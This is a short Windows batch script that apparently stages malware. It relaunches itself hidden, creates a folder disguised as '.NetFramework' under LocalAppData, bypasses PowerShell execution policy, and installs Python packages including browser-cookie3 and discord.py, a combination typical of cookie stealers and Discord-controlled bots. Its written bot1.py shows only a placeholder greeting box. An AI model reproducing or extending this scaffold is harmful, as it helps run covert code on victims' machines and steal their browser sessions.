@echo off
if "%1"=="hidden" goto start
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
exit

:start
setlocal

set "WORKDIR=%LOCALAPPDATA%\.NetFramework"

if not exist "%WORKDIR%" (
    mkdir "%WORKDIR%"
)

cd /d "%WORKDIR%"

python -m venv venv
if errorlevel 1 exit /b 1

powershell -ExecutionPolicy Bypass -Command ".\venv\Scripts\Activate.ps1; python -m pip install --upgrade pip; pip install requests numpy pillow opencv-python pyautogui psutil pywin32 pycryptodome scipy pytz discord.py browser-cookie3"
if errorlevel 1 exit /b 1

(
echo import ctypes
echo ctypes.windll.user32.MessageBoxW(0, "heeellllooo", "Greeting", 0)
) > bot1.py

powershell -ExecutionPolicy Bypass -Command ".\venv\Scripts\Activate.ps1; python bot1.py"

exit